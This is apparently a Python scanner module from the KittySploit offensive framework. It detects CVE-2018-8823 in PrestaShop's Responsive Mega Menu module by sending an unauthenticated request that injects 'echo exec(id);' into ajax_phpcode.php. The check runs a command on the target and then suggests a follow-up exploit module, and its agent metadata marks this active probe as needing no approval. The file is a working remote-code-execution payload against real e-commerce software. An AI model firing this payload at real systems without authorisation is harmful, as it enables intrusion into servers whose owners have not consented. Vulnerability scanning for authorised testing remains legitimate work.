#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PrestaShop Responsive Mega Menu ajax_phpcode.php RCE (CVE-2018-8823)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PrestaShop Mega Menu - ajax_phpcode.php RCE Detection (CVE-2018-8823)',
        'description': (
            'Detects CVE-2018-8823 by executing id via '
            '/modules/bamegamenu/ajax_phpcode.php?code=echo%20exec(id);'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'prestashop', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/multi/http/prestashop_bamegamenu_cve_2018_8823_rce',
                ],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-8823',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-8824',
        ],
        'cve': 'CVE-2018-8823',
    }

    base_path = OptString('', 'Optional PrestaShop base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        path = f'{self._prefix()}/modules/bamegamenu/ajax_phpcode.php?code=echo%20exec%28id%29%3B'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'uid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='PrestaShop bamegamenu RCE (CVE-2018-8823)',
                path=f'{self._prefix()}/modules/bamegamenu/ajax_phpcode.php',
            )
            return True
        return False
